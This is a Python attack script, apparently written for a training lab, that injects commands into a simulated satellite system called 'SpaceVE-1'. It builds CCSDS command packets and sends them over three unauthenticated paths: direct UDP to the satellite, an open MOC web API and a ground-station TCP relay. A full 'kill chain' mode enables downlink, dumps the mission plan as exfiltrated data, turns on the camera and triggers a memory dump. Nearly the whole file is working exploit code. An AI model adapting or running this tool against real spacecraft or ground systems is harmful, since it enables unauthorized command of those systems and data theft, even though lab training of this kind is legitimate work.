#!/usr/bin/env python3
"""
command_injector.py — SpaceVE-1 Command Injection Tool
SpaceVE-1 Lab Attack Tool

Demonstrates 3 command injection attack vectors against SpaceVE-1:

  Vector 1: Direct UDP injection to satellite (bypasses ground station entirely)
  Vector 2: MOC unauthenticated API (/api/command/raw, no login required)
  Vector 3: Ground station TCP relay (no source IP check)

This tool exercises all three misconfigurations in sequence and shows
the satellite state change via MOC telemetry.

Usage:
  python3 command_injector.py --attack udp
  python3 command_injector.py --attack moc_api
  python3 command_injector.py --attack gs_relay
  python3 command_injector.py --attack all
  python3 command_injector.py --attack chain   (full kill chain)

Common Beginner Mistakes:
  - Sending telemetry-type (type=0) packets instead of command-type (type=1)
  - Wrong checksum: must XOR sec_byte0 with each user_data byte against 0xFF
  - Forgetting the 4-byte length prefix on the TCP ground station protocol
  - Checking MOC web UI before telemetry has had time to update (wait 2s)
"""

import argparse
import json
import socket
import struct
import sys
import time

import requests

SATELLITE_IP   = "192.168.60.100"
SATELLITE_PORT = 1234
MOC_IP         = "192.168.60.11"
MOC_PORT       = 8080
GS_IP          = "192.168.60.10"
GS_PORT        = 4820
SATELLITE_APID = 0x200

COMMANDS = {
    "nop":         0x00,
    "camera_on":   0x01,
    "camera_off":  0x02,
    "downlink_on": 0x03,
    "downlink_off":0x04,
    "memory_dump": 0x05,
    "reboot":      0x06,
}


# ------------------------------------------------------------------
# Packet builder
# ------------------------------------------------------------------

def build_ccsds(func_code: int, user_data: bytes = b"", seq: int = 0) -> bytes:
    word0 = (0b000 << 13) | (1 << 12) | (1 << 11) | (SATELLITE_APID & 0x7FF)
    word1 = (0b11 << 14) | (seq & 0x3FFF)
    data_len = 1 + len(user_data)
    primary = struct.pack(">HHH", word0, word1, data_len)
    sec_byte0 = (func_code & 0x7F) << 1
    cksum = 0xFF
    cksum ^= sec_byte0
    for b in user_data:
        cksum ^= b
    return primary + bytes([sec_byte0, cksum]) + user_data


# ------------------------------------------------------------------
# Attack vectors
# ------------------------------------------------------------------

def attack_udp(cmd: str = "downlink_on") -> bool:
    """Vector 1: direct UDP injection to satellite — no auth, no source check."""
    fc = COMMANDS.get(cmd, 0x03)
    pkt = build_ccsds(fc)
    print(f"  [UDP] Sending '{cmd}' (func=0x{fc:02X}) -> {SATELLITE_IP}:{SATELLITE_PORT}")
    print(f"  [UDP] Packet: {pkt.hex()}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(pkt, (SATELLITE_IP, SATELLITE_PORT))
    sock.close()
    print(f"  [UDP] Sent. No authentication required.")
    return True


def attack_moc_api(cmd: str = "downlink_on") -> bool:
    """Vector 2: MOC /api/command/raw — unauthenticated endpoint."""
    fc = COMMANDS.get(cmd, 0x03)
    pkt = build_ccsds(fc)
    url = f"http://{MOC_IP}:{MOC_PORT}/api/command/raw"
    payload = {"hex": pkt.hex(), "note": f"injected_{cmd}"}
    print(f"  [MOC] POST {url}")
    print(f"  [MOC] Payload: {payload}")
    try:
        resp = requests.post(url, json=payload, timeout=5)
        print(f"  [MOC] Response {resp.status_code}: {resp.text[:200]}")
        return resp.status_code == 200
    except requests.RequestException as e:
        print(f"  [MOC] Error: {e}")
        return False


def attack_gs_relay(cmd: str = "downlink_on") -> bool:
    """Vector 3: ground station TCP relay — no source IP check."""
    fc = COMMANDS.get(cmd, 0x03)
    pkt = build_ccsds(fc)
    length_prefix = struct.pack(">I", len(pkt))
    full_msg = length_prefix + pkt
    print(f"  [GS]  Connecting to {GS_IP}:{GS_PORT}")
    print(f"  [GS]  Sending 4-byte length prefix ({len(pkt)}) + CCSDS packet")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((GS_IP, GS_PORT))
        sock.sendall(full_msg)
        resp = sock.recv(1)
        sock.close()
        ok = resp == b"\x01"
        print(f"  [GS]  Response: {'0x01 (forwarded)' if ok else '0x00 (error)'}")
        return ok
    except Exception as e:
        print(f"  [GS]  Error: {e}")
        return False


def check_telemetry() -> dict:
    url = f"http://{MOC_IP}:{MOC_PORT}/api/telemetry"
    try:
        resp = requests.get(url, timeout=3)
        return resp.json()
    except Exception:
        return {}


def attack_chain():
    """Full kill chain: recon -> inject -> confirm -> mission_plan exfil."""
    print("\n  === SpaceVE-1 Full Attack Chain ===\n")

    # Step 1: Recon — pull telemetry without auth
    print("  [Step 1] Unauthenticated telemetry recon")
    tlm = check_telemetry()
    print(f"  [Step 1] Satellite state: {json.dumps(tlm, indent=4)}")
    print()

    # Step 2: Enable downlink via direct UDP
    print("  [Step 2] Enable downlink (direct UDP injection)")
    attack_udp("downlink_on")
    print()
    time.sleep(2)

    # Step 3: Confirm via telemetry
    print("  [Step 3] Confirm state change")
    tlm = check_telemetry()
    dl = tlm.get("downlink_enabled", False)
    mp = tlm.get("mission_plan", {})
    print(f"  [Step 3] downlink_enabled: {dl}")
    if mp:
        print(f"  [Step 3] mission_plan (EXFILTRATED): {json.dumps(mp, indent=4)}")
    print()

    # Step 4: Camera on via MOC unauthenticated API
    print("  [Step 4] Enable camera via MOC unauthenticated API")
    attack_moc_api("camera_on")
    print()

    # Step 5: Memory dump via ground station relay
    print("  [Step 5] Memory dump via ground station relay")
    attack_gs_relay("memory_dump")
    print()
    time.sleep(2)

    # Step 6: Final state
    print("  [Step 6] Final satellite state")
    tlm = check_telemetry()
    print(f"  {json.dumps(tlm, indent=4)}")
    print()
    print("  === Chain complete. All attack surfaces exploited. ===\n")


# ------------------------------------------------------------------
# Main
# ------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(description="SpaceVE-1 command injection tool")
    p.add_argument("--attack", choices=["udp", "moc_api", "gs_relay", "all", "chain"],
                   default="chain")
    p.add_argument("--cmd", default="downlink_on", choices=COMMANDS.keys(),
                   help="Command to inject (for udp/moc_api/gs_relay modes)")
    args = p.parse_args()

    if args.attack == "udp":
        print()
        attack_udp(args.cmd)
    elif args.attack == "moc_api":
        print()
        attack_moc_api(args.cmd)
    elif args.attack == "gs_relay":
        print()
        attack_gs_relay(args.cmd)
    elif args.attack == "all":
        print()
        attack_udp(args.cmd)
        print()
        attack_moc_api(args.cmd)
        print()
        attack_gs_relay(args.cmd)
    elif args.attack == "chain":
        attack_chain()


if __name__ == "__main__":
    main()
